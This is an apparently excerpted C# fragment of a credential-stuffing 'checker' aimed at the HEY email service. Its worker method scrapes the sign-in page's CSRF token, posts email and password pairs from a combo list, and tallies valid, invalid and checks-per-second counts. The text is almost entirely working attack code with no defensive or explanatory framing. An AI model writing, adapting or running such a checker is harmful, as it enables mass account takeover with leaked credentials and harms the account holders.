        ...
        static void Worker(string combo)
        {
            try
            {
                ...
                })
                {
                    ...
                    string pre = request.Get("https://app.hey.com/sign_in").ToString();
                    var TOKEN = Functions.LR(pre, "<meta name=\"csrf-token\" content=\"" ,"\" />").FirstOrDefault();
                    request.AddHeader("x-csrf-token", TOKEN);
                    var res0 = request.Post("https://app.hey.com/sign_in", $"email_address={WebUtility.UrlEncode(credentials[0])}&password={WebUtility.UrlEncode(credentials[1])}&commit=Sign+in", "application/x-www-form-urlencoded;charset=UTF-8");
                    string text0 = res0.ToString();

                    if (res0.Address.ToString() == "https://app.hey.com/")
                    {
                        Variables.Valid++;
                        Variables.Checked++;
                        Variables.cps++;
                    ...
                    else if (text0.Contains("That email or password is incorrect"))
                    {
                        Variables.Invalid++;
                        Variables.Checked++;
                        Variables.cps++;
